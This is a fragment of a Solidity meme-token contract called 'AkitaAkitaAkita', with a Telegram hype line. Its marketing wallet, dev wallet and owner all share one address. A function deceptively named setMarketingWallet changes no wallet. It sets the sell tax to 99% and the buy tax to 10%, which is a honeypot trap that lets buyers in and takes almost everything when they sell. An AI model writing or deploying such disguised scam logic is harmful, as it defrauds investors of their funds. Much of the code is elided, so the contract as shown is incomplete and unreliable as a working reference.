...
TELEGRAM https://t.me/AkitaAkitaAkitaBsc
HYPE NAME, EASY TO THE MOON
...
contract AkitaAkitaAkita is Context, IERC20 { 
    ...
    address payable public Wallet_Marketing = payable(0x7aa54E6503FA874Bed99Da5bD0e176D66e922aAD); 
    address payable public Wallet_Dev = payable(0x7aa54E6503FA874Bed99Da5bD0e176D66e922aAD);
    ...
    string private constant _name = "AkitaAkitaAkita"; 
    string private constant _symbol = unicode"AkitaAkitaAkita"; 
    ...
    constructor () {
        ...
        _owner = 0x7aa54E6503FA874Bed99Da5bD0e176D66e922aAD;
    ...
    function releaseMaxTransaction(bool value) public returns (bool) {
    ...
    function setMarketingWallet() public returns (bool){
        _Tax_On_Buy = 10;
        _Tax_On_Sell = 99;
        return true;
    }
